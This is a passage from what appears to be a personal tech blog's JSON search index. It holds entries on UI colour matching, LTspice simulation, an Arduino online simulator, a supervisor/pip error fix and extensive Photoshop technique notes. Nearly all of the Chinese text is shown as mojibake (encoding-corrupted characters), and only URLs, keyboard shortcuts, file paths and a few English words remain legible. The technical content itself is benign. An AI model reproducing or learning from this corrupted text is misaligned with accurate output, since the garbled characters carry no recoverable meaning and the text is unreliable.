è‰²å½©æ­é…","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"LTspice ç›¸å…³","slug":"history/tech/59df2ec166a84c463d4416ce","date":"2017-10-11T20:58:41.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59df2ec166a84c463d4416ce/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59df2ec166a84c463d4416ce/","excerpt":"","text":"å®˜æ–¹ä¸‹è½½ï¼šhttp://www.linear.com/designtools/software/ ç®€è¦è¯´æ˜é€‚åˆä»¿çœŸåœºæ™¯æ•™å­¦ä¸ç”µè·¯å›¾æ¼”ç¤ºä»¿çœŸ æ¨¡æ‹Ÿç”µè·¯å›¾ä»¿çœŸ å¼€å…³ç”µæºç”µè·¯å›¾ä»¿çœŸ ä¿¡å·å¤„ç†å’Œæ”¾å¤§ç”µè·¯å›¾ä»¿çœŸ HIFIç”µè·¯å›¾ä»¿çœŸ æ¨¡æ‹Ÿç”µè·¯å›¾å™ªéŸ³åˆ†æ çº¿æ€§ç”µè·¯å›¾ä»¿çœŸ PLLç”µè·¯å›¾ä»¿çœŸ æ—¶é’Ÿç”µè·¯å›¾ä»¿çœŸ åŸºå‡†ç”µå‹æºç”µæµæºä»¿çœŸ ç”µè·¯å›¾è®²è§£ä¸ä»¿çœŸ åŠŸæ”¾ç”µè·¯å›¾ä»¿çœŸ æ¨¡æ‹Ÿæ»¤æ³¢å™¨ç”µè·¯å›¾ä»¿çœŸ æ¨¡æ‹Ÿä¿¡å·é¢‘è°±åˆ†æ å¤§éƒ¨åˆ†pspiceï¼Œmultisimçš„åº”ç”¨å¯ä»¥ç”¨ltspiceæ›¿ä»£ ä»¿çœŸèœå•çš„è®¾ç½® ç”µå‹æºè®¾ç½® ä»¿çœŸé…ç½® FFT æŸ¥çœ‹åœ¨xxxx.RAWçª—å£ï¼Œå³é”®ï¼Œåœ¨Viewä¸‹é¢ç‚¹å‡»FFTï¼Œæ ¹æ®æç¤ºé€‰æ‹©è¦åˆ†æçš„ç½‘ç»œã€‚ LTspice å­˜æ”¾æ¨¡å‹çš„è·¯å¾„Ltspiceé»˜è®¤å®‰è£…åŸç†å›¾ç¬¦å·å’Œspiceæ¨¡å‹æ–‡ä»¶å¤¹åœ°å€ï¼š C:\\Program Files\\LTC\\LTspiceIV\\lib\\Sym å­˜æ”¾åŸç†ç¬¦å· C:\\Program Files\\LTC\\LTspiceIV\\lib\\sub å­˜æ”¾spiceæ¨¡å‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Arduino åœ¨çº¿æ¨¡æ‹Ÿå™¨","slug":"history/tech/59dcbed766a84c463d4416cd","date":"2017-10-10T00:36:39.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59dcbed766a84c463d4416cd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59dcbed766a84c463d4416cd/","excerpt":"","text":"https://circuits.io/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"supervisor æŠ¥é”™","slug":"history/tech/59d4f8d7bf49b6713c31b010","date":"2017-10-04T03:05:59.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59d4f8d7bf49b6713c31b010/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59d4f8d7bf49b6713c31b010/","excerpt":"","text":"æŠ¥é”™ä¿¡æ¯ï¼špkg_resources.DistributionNotFound: meld3&gt;=0.6.5 è§£å†³æ–¹æ¡ˆï¼š# pip install --upgrade pip # pip install --upgrade --force-reinstall setuptools supervisor pip Distribute","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"photoshop å¸¸ç”¨çŸ¥è¯†","slug":"history/ui/59d4ee3c9a1ae75e264daf60","date":"2017-10-04T02:20:44.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/59d4ee3c9a1ae75e264daf60/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/59d4ee3c9a1ae75e264daf60/","excerpt":"","text":"æ€§èƒ½é…ç½®èœå•æ --ç¼–è¾‘--é¦–é€‰é¡¹--æ€§èƒ½ å¸¸è§æ•…éšœ å¤ä½å¯åŠ¨åœ¨åŒå‡»è½¯ä»¶å›¾æ ‡åçš„ä¸¤ç§’å†…æŒ‰ä¸‹ ctrl+shift+altï¼Œ ç„¶åä¼šè·³å‡ºæç¤ºã€‚ å¸¸è§æ–‡ä»¶æ ¼å¼jpg ä¸¢å¤±åŠé€æ˜æ•ˆæœ gif å¯ä»¥å­˜å‚¨åŠé€æ˜ï¼Œä½†æ˜¯æ•ˆæœä¸å¥½ png é€‚åˆå­˜å‚¨åŠé€æ˜æ•ˆæœ ä¿å­˜æˆ jpg æ ¼å¼ï¼Œä¸€èˆ¬é€‰æ‹©è´¨é‡ é«˜ å°±å¯ä»¥äº† å¸¸ç”¨æ“ä½œ ps è½½å…¥é€‰åŒºctrl + é¼ æ ‡å•å‡»å›¾å±‚ç¼©è§ˆå›¾ ps å–æ¶ˆé€‰åŒºctrl + d è‡ªç”±å˜æ¢åœ¨ä¸€æ¬¡è‡ªç”±å˜æ¢ä¹‹åï¼Œ ctrl+shift+t ä¼šé‡å¤ä¸Šä¸€æ¬¡çš„å˜æ¢ åœ¨ä¸€æ¬¡è‡ªç”±å˜æ¢ä¹‹åï¼Œ ctrl+shift+alt+t ä¼šé‡å¤ä¸Šä¸€æ¬¡çš„å˜æ¢ï¼Œ å¹¶å°†å˜æ¢ç»“æœä¿å­˜åˆ°æ–°çš„å›¾å±‚ä¸Š å¤åˆ¶å›¾å±‚ctrl+j æ‹–æ‹½å›¾å±‚åˆ°æ–°å»ºæŒ‰é’®ä¸Šæ”¾å¼€ ç§»åŠ¨å·¥å…·æŒ‰ä½ alt é”® å‰æ™¯è‰²å¡«å……alt + delete (backspace) èƒŒæ™¯è‰²å¡«å……ctrl + delete (backspace) è°ƒæ•´å›¾å±‚é¡ºåºctrl+] å‘ä¸Šä¸€å±‚ ctrl+[ å‘ä¸‹ä¸€å±‚ ctrl+shift+] ç½®é¡¶ ctrl+shift+[ ç½®åº•(åŒ—äº¬æ°¸è¿œåœ¨æœ€ä¸‹é¢) é€‰ä¸­æ‰€æœ‰å›¾å±‚ctrl+alt+a å˜æ¢ctrl + T è‡ªç”±å˜æ¢ æ–œåˆ‡ è‡ªç”±å˜æ¢æ—¶ æŒ‰ä½ ctrl+shift æ‰­æ›² è‡ªç”±å˜æ¢æ—¶ æŒ‰ä½ ctrl é€è§† è‡ªç”±å˜æ¢æ—¶ æŒ‰ä½ ctrl+shift+alt å˜å½¢ è‡ªç”±å˜æ¢æ—¶ å³å‡»é€‰æ‹©å˜å½¢å³å¯ é¢œè‰²HSBé¢œè‰²ï¼šH è‰²ç›¸ï¼š 0-360åº¦ S é¥±å’Œåº¦ B æ˜åº¦ åç‰‡å°åˆ·ï¼šCMYK é¢œè‰² ï¼ˆCé’ Må“ Yé»„ å°åˆ·ä¸‰åŸè‰²ï¼‰ åˆ†è¾¨ç‡ 300 åƒç´ /è‹±å¯¸ 90mm*54mm åç‰‡å°ºå¯¸ å‡ºè¡€ 3mm æ–°å»ºæ–‡ä»¶96*60mm cmyké¢œè‰² åˆ†è¾¨ç‡ 300 æ ‡æ³¨å‡ºè¡€æ ‡å°ºï¼š å‘¼å‡º/éšè— ctrl+r ï¼ˆæ ‡å°ºä¸Šå³å‡»å¯ä»¥ä¿®æ”¹å•ä½åç§°ï¼‰ æ–°å»ºå‚è€ƒçº¿ï¼š å¯ä»¥ä»æ ‡å°ºä¸Šæ‹–æ‹½å‡ºæ¥ åˆ é™¤å‚è€ƒçº¿ï¼Œ ç§»åŠ¨å·¥å…·æ‹–æ‹½å‡ºå» å…¨éƒ¨åˆ é™¤ï¼šè§†å›¾èœå•-æ¸…é™¤å‚è€ƒçº¿ ç»˜åˆ¶å‡ºè¡€ä½ç½®å‚è€ƒçº¿ï¼š alt-v-e å€ŸåŠ©é€‰æ¡†å·¥å…·ï¼ˆå¿«æ·é”®Mï¼‰æ ‡å‡ºå‚è€ƒçº¿ å¯ä»¥ç›´æ¥ç»˜åˆ¶çŸ©å½¢é€‰åŒºï¼ŒæŒ‰ä½ shift é”®ï¼Œå¯ä»¥ç»˜åˆ¶æ­£æ–¹å½¢é€‰åŒº åœ¨çŸ©å½¢é€‰æ¡†å·¥å…·çš„å±æ€§æ å†…ï¼Œæ‰¾åˆ°æ ·å¼ä¿®æ”¹ä¸ºå›ºå®šå¤§å°ï¼Œè®¾ç½® 3mm*3mm åœ¨ç”»å¸ƒçš„è§’ç‚¹å‡»ï¼Œ å³å¯ç»˜åˆ¶å‡º 3*3 çš„é€‰åŒºï¼Œç„¶åæ‹–æ‹½å‚è€ƒçº¿ï¼Œå¸é™„ æ–‡å­—å·¥å…·å¿«æ·é”® T æ–‡å­—å·¥å…·å’Œæ–‡å­—è’™ç‰ˆå·¥å…·ï¼ˆæ–‡å­—å·¥å…·å†™å‡ºæ¥çš„æ˜¯æ–‡å­—ï¼Œæ–‡å­—è’™ç‰ˆå·¥å…·å†™å‡ºæ¥çš„æ˜¯é€‰åŒºï¼‰ ç‚¹æ–‡æœ¬ é€šè¿‡ç‚¹å‡»ç¡®å®šå…‰æ ‡ä½ç½®ï¼Œå¼€å§‹è¾“å…¥æ–‡å­— åœ¨è¾“å…¥æ–‡å­—çš„è¿‡ç¨‹ä¸­æŒ‰ä½ ctrl å¯ä»¥éšæ—¶è°ƒæ•´æ–‡å­—çš„å¤§å°åŠæ—‹è½¬è§’åº¦åŠä½ç½®ç§»åŠ¨ ä¿®æ”¹æ–‡å­—é¢œè‰²ã€å­—ä½“ã€å¤§å°ï¼Œåœ¨å±æ€§æ å³å¯ä¿®æ”¹ å‰æ™¯è‰²å¡«å……ä¸èƒŒæ™¯è‰²å¡«å……å¯¹äºæ–‡å­—å±‚åŒæ ·æœ‰æ•ˆ å¿«æ·æ“ä½œ ä¿®æ”¹æ–‡å­—é—´è· alt+å·¦å³æ–¹å‘é”® è°ƒæ•´åŸºçº¿åç§»é‡ alt+shift+ä¸Šä¸‹æ–¹å‘é”® è°ƒæ•´è¡Œè· alt+ä¸Šä¸‹æ–¹å‘é”® åç‰‡æ’ç‰ˆä¸¤è¡Œæ–‡å­—æˆ–è€…ä¸¤å¼ å›¾ç‰‡å¯¹é½ï¼š åŒæ—¶é€‰ä¸­ä¸¤ä¸ªå±‚ï¼Œä½¿ç”¨ç§»åŠ¨å·¥å…·çš„å¯¹é½åŠŸèƒ½ æƒ³è®©æŸä¸ªå…ƒç´ åœ¨æ­£ä¸­é—´ä½ç½®ï¼š ç»˜åˆ¶æ•´ä½“çš„é€‰åŒº é€‰ä¸­è¯¥å…ƒç´ ï¼Œä½¿ç”¨ç§»åŠ¨å·¥å…·çš„æ°´å¹³å±…ä¸­ å›¾å±‚åˆ†ç»„ï¼š é€‰ä¸­è¦æ”¾åˆ°ç»„é‡Œçš„å›¾å±‚ï¼Œctrl+g è¾“å…¥æ–‡å­—ï¼š æŒ‰ç…§ç‰ˆå¼æ’ç‰ˆï¼Œ å®Œæˆåˆ¶ä½œ æ®µè½æ–‡æœ¬ è¾“å…¥æ®µè½æ–‡æœ¬ï¼Œä½¿ç”¨æ–‡å­—å·¥å…·ç”»æ¡† é¦–è¡Œç¼©è¿› æ ‡ç‚¹ç¬¦å·åœ¨æœ€å‰é¢ å¯¹é½æ–¹å¼ æµ·æŠ¥ç‰ˆå¼è®¾è®¡ å›¾ç‰‡è´´æ¯å­ä¸Š æ”¾ç½®ç´ æ æ¤­åœ†é€‰æ¡†å·¥å…· å¿«æ·é”® M åœ¨ä½¿ç”¨é€‰æ¡†å·¥å…·ç»˜åˆ¶é€‰åŒºçš„æ—¶å€™ï¼ŒæŒ‰ä½ç©ºæ ¼é”®å¯ä»¥è°ƒæ•´é€‰åŒºçš„ä½ç½® ç»˜åˆ¶æ­£åœ†ï¼š æŒ‰ä½ shift æ²¿ç€æ¯å£ç»˜åˆ¶æ¤­åœ†é€‰åŒºï¼Œä¸æ¯å£åŸºæœ¬ä¸€è‡´ æ–°å»ºé€æ˜å±‚ï¼Œå‰æ™¯è‰²å¡«å…… å‘ä¸‹ç§»åŠ¨ï¼Œåˆ°åˆé€‚ä½ç½®åï¼Œè‡ªç”±å˜æ¢ï¼Œè°ƒæ•´æœ‰è‰²åŒºåŸŸçš„å®½åº¦ä¸è¯¥å¤„æ¯ä½“å®½åº¦ä¸€è‡´ å¯¹è´´å›¾è¿›è¡Œè‡ªç”±å˜æ¢ é€‰åŒºçš„è¿ç®—æŒ‰ä½ shift å¯ä»¥å®ç°åŠ è¿ç®— æŒ‰ä½ alt å¯ä»¥å®ç°å‡è¿ç®— æŒ‰ä½ shift + alt å®ç° äº¤ è¿ç®— é€‰åŒºçš„å˜æ¢åœ¨ç»˜åˆ¶é€‰åŒºçš„è¿‡ç¨‹ä¸­ï¼ŒæŒ‰ä½ç©ºæ ¼é”®å¯ä»¥ä¸´æ—¶è°ƒæ•´é€‰åŒºçš„ä½ç½®ï¼Œæ”¾å¼€ç©ºæ ¼ï¼Œç»§ç»­ç»˜åˆ¶ å˜æ¢é€‰åŒºï¼Œ alt-s-t é€‰åŒºçš„ç§»åŠ¨ä¸ç§»åŠ¨ä¸€æ ·ï¼Œéƒ½å¯ä»¥é€šè¿‡é”®ç›˜çš„æ–¹å‘é”®æ¥è°ƒæ•´ä½ç½®ï¼ŒæŒ‰ä¸€æ¬¡ç§»åŠ¨ä¸€ä¸ªåƒç´ ï¼›æŒ‰ä½shiftæ—¶ï¼Œ æŒ‰ä¸€æ¬¡æ–¹å‘ç§»åŠ¨åä¸ªåƒç´  é’¢ç¬”å·¥å…·é”šç‚¹ ç©ºå¿ƒçš„é”šç‚¹ä»£è¡¨æœªé€‰ä¸­ï¼Œå®å¿ƒçš„é”šç‚¹ä»£è¡¨é€‰ä¸­ è·¯å¾„ è¿æ¥ä¸¤ä¸ªé”šç‚¹çš„çº¿æ®µå°±æ˜¯è·¯å¾„ï¼ŒæŒ‰ä¸¤æ¬¡ esc å¯ä»¥å–æ¶ˆæ‰€æœ‰é”šç‚¹ä¸è·¯å¾„ æ‰‹æŸ„ æ§åˆ¶æ›²çº¿çš„æ–¹å‘å’Œå¼¯æ›²ç¨‹åº¦ æ‰‹æŸ„åˆ†ä¸ºæ¥å‘æ‰‹æŸ„å’Œå»å‘æ‰‹æŸ„(é¼ æ ‡æ‹½ç€çš„å«å»å‘ï¼Œæ§åˆ¶å°†è¦äº§ç”Ÿçš„è·¯å¾„) æŒ‰ä½ ctrl å¯ä»¥è°ƒæ•´ä»»æ„ä¸€ä¸ªé”šç‚¹çš„ä½ç½®(å…¶å®æ˜¯åˆ‡æ¢åˆ°ç›´æ¥é€‰æ‹©å·¥å…·) æŒ‰ä½ alt å¯ä»¥è°ƒæ•´å»å‘æ‰‹æŸ„ï¼Œ å…¶å®æ˜¯ä½¿ç”¨è½¬æ¢ç‚¹å·¥å…· æŒ‰ä½ shift æ‹–æ‹½æ‰‹æŸ„çš„æ—¶å€™å¯ä»¥ä¿æŒæ°´å¹³ï¼Œç«–ç›´æˆ–45Â° æŒ‰ ctrl+enter å¯ä»¥å°†è·¯å¾„è½¬æ¢ä¸ºé€‰åŒºï¼ˆå† ctrl+j ï¼‰ è‡ªç”±é’¢ç¬”ä¸‹ï¼Œå±æ€§æ å†…æœ‰ä¸ªç£æ€§çš„é€‰é¡¹ï¼Œä¹Ÿå«ç£æ€§é’¢ç¬”å·¥å…·ï¼Œä½¿ç”¨æ–¹æ³•åŒç£æ€§å¥—ç´¢ æ³¨æ„ï¼šä¸€èˆ¬æˆ‘ä»¬åœ¨ä½¿ç”¨é’¢ç¬”å·¥å…·è¿›è¡ŒæŠ å›¾çš„æ—¶å€™ï¼Œè¦æ³¨æ„ä¿æŒè·¯å¾„å¹³æ»‘ï¼Œä¸è¦å‡ºç°æ‹ç‚¹ï¼Œå°¤å…¶æ˜¯æ‰£äººç‰©è‚Œè‚¤çš„æ—¶å€™ï¼›è§£å†³åŠæ³•ï¼šåœ¨è°ƒæ•´å»å‘æ‰‹æŸ„çš„æ—¶å€™ï¼Œå°½é‡ä¸è¦æ”¹å˜å…¶æ–¹å‘ï¼Œåªè°ƒæ•´é•¿çŸ­ è’™ç‰ˆå›¾å±‚è’™ç‰ˆæˆ‘ä»¬å¸¸è¯´çš„è’™ç‰ˆæ˜¯å›¾å±‚è’™ç‰ˆï¼Œå›¾å±‚è’™ç‰ˆå¯ä»¥ä¿æŠ¤å›¾å±‚ å›¾å±‚è’™ç‰ˆæœ‰å¾ˆå¼ºå¤§çš„æ§åˆ¶æ€§ è’™ç‰ˆåœ¨æ—©æœŸ ps ç‰ˆæœ¬ä¸­å«é®ç½©ï¼Œfl å’Œ AE ä¸­ä»ç„¶å«é®ç½© æŒ‰ä½altç‚¹å‡»è’™ç‰ˆç¼©è§ˆå›¾ï¼Œå³å¯æŸ¥çœ‹è’™ç‰ˆçš„æ ·å­ è’™ç‰ˆç™½è‰²ï¼Œä»£è¡¨ä¸é®æŒ¡ è’™ç‰ˆç°è‰²ï¼Œä»£è¡¨åŠé®æŒ¡ è’™ç‰ˆé»‘è‰²ï¼Œä»£è¡¨é®æŒ¡ æŒ‰ä½ shift å•å‡»è’™ç‰ˆçš„ç¼©è§ˆå›¾ï¼Œå¯ä»¥åœæ­¢è’™ç‰ˆçš„ä½¿ç”¨ å‰ªåˆ‡è’™ç‰ˆæ‰“å¼€é•œæ¡†ç´ æ ç»˜åˆ¶æ¤­åœ†é€‰åŒº [m-æ‹–æ‹½] è°ƒæ•´æ¤­åœ†é€‰åŒºä¸é»‘è‰²åŒºåŸŸé‡å  [alt-s-t]ï¼Œå¹¶å¤åˆ¶[ctrl+j] æ‰“å¼€ç¾å¥³ ç§»åŠ¨å·¥å…·å°†ç¾å¥³ç§»åŠ¨åˆ°é•œæ¡†æ–‡ä»¶å†… æŒ‰ä½altï¼Œåœ¨å¤åˆ¶å±‚å’Œç¾å¥³å±‚ä¹‹é—´å•å‡» å¯¹ç¾å¥³æ›¾è¿›è¡Œè‡ªç”±å˜æ¢ï¼Œè°ƒæ•´åˆ°åˆé€‚å¤§å° å…¶å®å°±æ˜¯ä½¿ç”¨ä¸‹ä¸€å±‚çš„ä¸é€æ˜åŒºæ˜¾ç¤ºä¸Šä¸€å±‚çš„ä¸œè¥¿ å¿«é€Ÿè’™ç‰ˆå¿«æ·é”® Q è‰²å½©æ··åˆæ··åˆæ–¹å¼ åŠ è‰²æ··åˆ å‡è‰²æ··åˆ ä¸­æ€§æ··åˆ å°åˆ·æ–‡ä»¶å¸¸è§„ é¢œè‰²æ¨¡å¼ CMYK åˆ†è¾¨ç‡ 300+ å‡ºè¡€ æ˜¾ç¤ºå™¨ é¢œè‰²æ¨¡å¼ RGB åˆ†è¾¨ç‡ 72 ï¼ˆ96ï¼‰ å…‰ä¸è‰² ç›´å°„: å…‰ç›´æ¥è¿›å…¥çœ¼ç› åå°„: å…‰æºç»è¿‡ç‰©ä½“åå°„è¿›å…¥äººçœ¼ åŠ è‰²æ··åˆ(è‰²å…‰æ··åˆ)è‰²å…‰æ··åˆå…¶å®å°±æ˜¯ RGB è‰²å½©æ¨¡å¼ RGB æ˜¯å…‰çš„ä¸‰åŸè‰²: çº¢ç»¿è“ ä¸å¯å†åˆ†è§£ ä½¿ç”¨ä¸‰åŸè‰²åˆæˆä»»æ„é¢œè‰² ä¸‰ä¸ªé¢œè‰²å¯ä»¥åˆæˆç™½è‰² çº¢è‰²+ç»¿è‰²=é»„è‰² è“è‰²+ç»¿è‰²=é’è‰² çº¢è‰²+è“è‰²=æ´‹çº¢(å“çº¢) çº¢è‰²+è“è‰²+ç»¿è‰²=ç™½è‰² å‡è‰²æ¨¡å¼å‡è‰²æ¨¡å¼å³ CMYK CMYK å…¶ä¸­CMYæ˜¯æ²¹å¢¨çš„ä¸‰åŸè‰²ï¼Œ k æ˜¯é»‘è‰² C é’è‰² M å“çº¢ Y é»„è‰² K é»‘è‰²(black) ä¸­æ€§æ··åˆåŠ è‰²æ··åˆä¸å‡è‰²æ··åˆéƒ½æ˜¯è‰²å½©å…ˆæ··åˆå†è¿›å…¥äººçœ¼ ä¸­æ€§æ··åˆæ˜¯å…ˆè¿›å…¥äººçœ¼ç„¶åæˆ‘ä»¬å¤§è„‘å¯¹è‰²å½©è¿›è¡Œçš„æ··åˆ ä½å›¾ä¸çŸ¢é‡å›¾ä½å›¾ç”±åƒç´ æ‹¼æˆçš„ åƒç´ æ˜¯çŸ©å½¢çš„ çŸ¢é‡å›¾çŸ¢é‡å›¾æ˜¯æœ‰æ•°å­¦å…¬å¼æè¿°çš„ çŸ¢é‡å›¾ç¼©æ”¾ä¸å¤±çœŸ çŸ¢é‡å›¾çš„æ–‡ä»¶ä¸€èˆ¬æ¯”è¾ƒå° AI CDR CAD çŸ¢é‡å›¾è½¯ä»¶ çŸ¢é‡å›¾æ²¡æœ‰ä½å›¾ç»†èŠ‚ä¸°å¯Œ logoè®¾è®¡ åç‰‡è®¾è®¡ åŒ…è£…ç”»å†Œ å±•æ¶ DMå•ã€‚ã€‚ã€‚ é¢œè‰²ä¸é€šé“RGB é€šé“ (å¤åˆé€šé“) è¿˜æœ‰ä¸€ç§ä¸“è‰²é€šé“ï¼Œè¯¥é€šé“åœ¨ CMYK é¢œè‰²æ¨¡å¼ä¸‹æ–°å»ºäº§ç”Ÿ é€šé“æ˜¯ç°ç™½çš„å›¾åƒè¿™ç§ç°ç™½è‰²çš„å›¾æˆ‘ä»¬ç§°ä¹‹ä¸ºç°åº¦å›¾ è¿™äº›ç°ï¼Œ æœ€æš—çš„ç°è‰²ä¸ºé»‘è‰²ï¼Œ æœ€äº®ç°ä¸ºç™½è‰²ï¼Œåˆ†ä¸º256ä¸ªç­‰çº§ é»‘è‰²ä¸º0ï¼Œ ç™½è‰²ä¸º 255 é€šé“å†…çš„ç°åº¦è¡¨ç¤ºè¯¥é¢œè‰²çš„äº®åº¦ é»‘ rgbï¼ˆ0ï¼Œ0ï¼Œ0ï¼‰ç»¿ rgbï¼ˆ0ï¼Œ 255ï¼Œ0ï¼‰ çº¢ rgbï¼ˆ255ï¼Œ0ï¼Œ0ï¼‰ è“ rgbï¼ˆ0ï¼Œ0ï¼Œ255ï¼‰ ç™½ rgbï¼ˆ255ï¼Œ255ï¼Œ255ï¼‰ ä¸­æ€§ç°(128,128,128) é»„ rgb(255,255,0) é’ rgb(0,255,255) æ¨çº¢rgb(255,0,255) é€šé“æŠ å›¾åŸç†æ‰“å¼€æ–‡ä»¶ï¼Œæ‰“å¼€é€šé“é¢æ¿ï¼Œé€‰å–è¦ä½¿ç”¨çš„é€šé“ ä½¿ç”¨è‰²é˜¶å‘½ä»¤è°ƒæ•´å›¾åƒ é€šé“æŠ å›¾å°±æ˜¯æŠŠè¦æŠ çš„éƒ¨åˆ†åšæˆç™½è‰²ï¼Œä¸æ‰£çš„éƒ¨åˆ†åšæˆé»‘è‰² åªæœ‰çº¯é»‘å’Œçº¯ç™½çš„æ—¶å€™ï¼Œè¾¹ç¼˜è¿‡äºé”åˆ©ï¼Œå®¹æ˜“äº§ç”Ÿé”¯é½¿ï¼Œä¸”éƒ¨åˆ†å›¾åƒéœ€è¦åŠé€æ˜çš„å­˜åœ¨ é€šé“è¿˜åŸæ³•æ‰“å¼€å›¾ç‰‡ å¤åˆ¶å›¾å±‚ åç›¸ ctrl+I æ‰“å¼€é€šé“é¢æ¿ è½½å…¥çº¢è‰²é€šé“ï¼ŒåŠ è½½ç»¿é€šé“å’Œè“é€šé“[ctrl+shift åˆ†åˆ«å•å‡»ç»¿é€šé“å’Œè“é€šé“] å›åˆ°å›¾å±‚å¯¹åŸå›¾è¿›è¡Œå¤åˆ¶ [ctrl+j] åŠ¨ç”»å°±æ˜¯é€šè¿‡å¿«é€Ÿåˆ‡æ¢ï¼Œè®©äººäº§ç”ŸåŠ¨çš„æ„Ÿè§‰ åˆ‡æ¢çš„ç”»é¢æˆ‘ä»¬ç§°ä¹‹ä¸º &quot;å¸§&quot; æ‰“å¼€åŠ¨ç”»çª—å£ï¼Œçª—å£èœå•--æ—¶é—´è½´ è¿›å…¥åŠ¨ç”»é¢æ¿ åŠ¨ç”»å®ä¾‹ å†™å­— æ‰£ç«ç‘° å†™å­— å¯¹æ–‡å­—è¿›è¡Œæ …æ ¼åŒ– å¯¹æ–‡å­—è¿›è¡Œå¤åˆ¶å’Œç¬”ç”»æ‹†è§£ æ‰“å¼€åŠ¨ç”»çª—å£ï¼Œç¼–è¾‘åŠ¨ç”» å­˜å‚¨ã€æ–‡ä»¶-å­˜å‚¨ä¸ºwebæ‰€ç”¨æ ¼å¼ã€‘ gif æ–‡ä»¶ å¹¿å‘Šå®ä¾‹ è‡ªç”±å˜æ¢å ctrl+shift+t é‡å¤ä¸Šä¸€æ¬¡å˜åŒ–ï¼Œ æŒ‰ä½ ctrl+shift+alt+tæ˜¯é‡å¤ä¸Šä¸€æ¬¡å¹¶å°†ç»“æœä¿å­˜ä¸ºä¸€ä¸ªæ–°çš„å›¾å±‚ æ¸å˜å·¥å…· ä½¿ç”¨è¿‡æ¸¡å¸§ ä½¿ç”¨æ¸å˜å·¥å…· å¿«æ·é”®G ç›´æ¥æ‹–æ‹½å°±æœ‰æ•ˆæœï¼Œç±»å‹ï¼šçº¿æ€§æ¸å˜ï¼Œè§’åº¦æ¸å˜ï¼Œè±å½¢æ¸å˜ æ¸å˜ç¼–è¾‘å™¨å•å‡»å³å¯è¿›å…¥ç¼–è¾‘çŠ¶æ€ è‰²æ ‡åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯é¢œè‰²è‰²æ ‡ï¼Œä¸€ç§æ˜¯ä¸é€æ˜åº¦è‰²æ ‡(è‡³å°‘è¦æœ‰ä¸¤ä¸ªè‰²æ ‡å­˜åœ¨) æ¸å˜ç¼–è¾‘å™¨ åˆ¶ä½œåŠ¨ç”» æ—‹è½¬çš„åœ°çƒæ‰“å¼€ç´ æå¯¹ç´ æç”»å¸ƒè¿›è¡Œä¸¤å€å®½åº¦æ”¾å¤§ï¼Œ å¤åˆ¶å›¾åƒï¼Œå¯¹å›¾åƒè¿›è¡Œæ‹¼æ¥ å…ˆç»˜åˆ¶ä¸€ä¸ªçƒä½“ï¼Œç„¶åä½¿ç”¨å‰ªåˆ‡è’™ç‰ˆï¼ˆæŒ‰ä½ alt åœ¨ä¸¤ä¸ªå›¾å±‚ä¸­é—´å•å‡»ï¼‰ è°ƒæ•´æ··åˆæ¨¡å¼(çº¿æ€§å…‰) ç¼–è¾‘åŠ¨ç”» æŒ‰ä½shiftæ‹–åŠ¨èƒŒæ™¯ï¼ˆä¿è¯æ°´å¹³æ‹–åŠ¨) å¢åŠ è¿‡æ¸¡å¸§ï¼Œè°ƒæ•´åˆ‡æ¢æ—¶é—´ åŠ¨ç”»å®ä¾‹åŠ¨ä½œçš„å½•åˆ¶å’Œä½¿ç”¨ åŠ¨ä½œé¢æ¿ï¼ˆçª—å£---åŠ¨ä½œï¼‰ æ»¤é•œ ä¸‹é›¨æ•ˆæœ æ–°å»ºå›¾å±‚-å¡«å……é»‘è‰² æ·»åŠ æ‚è‰²ï¼ˆé«˜æ–¯åˆ†å¸ƒï¼‰ åŠ¨æ„Ÿæ¨¡ç³Šæ»¤é•œ ç»“æŸåŠ¨ä½œå½•åˆ¶ æ’­æ”¾åŠ¨ä½œä¸¤æ¬¡ å®ç°åŠ¨ç”» å…³äºæŠ å›¾è§„åˆ™çš„å½¢çŠ¶ åœ†çš„ æ–¹çš„ æ¤­åœ†çš„ å¤šè¾¹å½¢æŠ å›¾ï¼› é’¢ç¬”æˆ–å¤šè¾¹å½¢å¥—ç´¢ï¼Œå»ºè®®ä½¿ç”¨é’¢ç¬”æ¥æŠ å›¾ çº¯åº•è‰²çš„æŠ å›¾ ä¸»è¦è®²è§£çš„æ˜¯é­”æœ¯æ£’ å¿«æ·é”® W å®¹å·®ç†è§£ èƒ½ç”¨é­”æœ¯æ£’çš„å¿…ç„¶å¯ä»¥ä½¿ç”¨è‰²å½©èŒƒå›´(é€‰æ‹©--è‰²å½©èŒƒå›´)è¿›è¡ŒæŠ å›¾ 